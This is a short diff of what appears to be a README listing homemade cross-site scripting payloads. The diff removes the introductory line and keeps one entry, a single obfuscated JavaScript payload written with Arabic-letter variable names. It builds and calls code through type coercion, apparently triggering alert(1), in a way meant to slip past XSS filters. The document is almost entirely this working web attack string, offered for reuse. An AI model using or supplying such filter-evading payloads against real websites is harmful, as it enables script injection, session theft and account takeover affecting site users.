@@ -1,6 +1,3 @@
-Just A list Of Some Multilingual XSS Payloads and other weird ones i made in my free time
-
-
 XSS Payload Written In Arabic
 ```
 ا='',ب=!ا+ا,ت=!ب+ا,ث=ا+{},ج=ب[ا++],ح=ب[خ=ا],د=++خ+ا,ذ=ث[خ+د],ب[ذ+=ث[ا]+(ب.ت+ث)[ا]+ت[د]+ج+ح+ب[خ]+ذ+ج+ث[ا]+ح][ذ](ت[ا]+ت[خ]+ب[د]+ح+ج+"(1)")()
